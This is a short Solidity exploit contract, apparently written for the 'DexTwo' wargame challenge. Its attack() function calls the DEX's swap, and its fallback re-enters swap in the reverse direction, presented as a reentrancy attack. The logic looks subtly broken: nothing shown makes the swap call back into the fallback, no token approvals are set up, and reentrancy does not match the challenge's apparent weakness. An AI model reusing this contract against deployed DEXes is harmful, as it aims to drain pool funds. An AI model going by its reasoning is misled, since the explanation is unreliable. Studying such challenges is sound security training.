pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
}

contract DexTwoReentrancyExploit {
    address public dexInstance;
    address public token1;
    address public token2;

    constructor(address _dexInstance, address _token1, address _token2) {
        dexInstance = _dexInstance;
        token1 = _token1;
        token2 = _token2;
    }

    function attack() external {
        IDexTwo(dexInstance).swap(token1, token2, 1);
    }

    fallback() external {
        IDexTwo(dexInstance).swap(token2, token1, 1);
    }

    function getBalances() external view returns (uint, uint) {
        return (IERC20(token1).balanceOf(dexInstance), IERC20(token2).balanceOf(dexInstance));
    }
}